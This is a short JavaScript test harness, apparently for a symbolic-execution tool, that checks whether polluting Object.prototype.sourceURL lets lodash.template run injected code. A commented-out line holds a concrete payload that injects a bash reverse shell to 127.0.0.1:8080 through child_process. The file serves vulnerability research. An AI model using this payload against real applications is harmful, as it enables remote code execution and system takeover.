const lodash = require('lodash')
const fs = require('fs')

var S$ = require('../../../lib/S$')


// Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"

// make it symbolic
Object.prototype.sourceURL = S$.pureSymbol('sourceURL_undef')

/**
 * Exported function call
 */
fs.readFile('/home/ubuntu/ExpoSE/TemplateEngines/lodash/template.ejs', (err, content) => {
    let compiled = lodash.template(content)
})


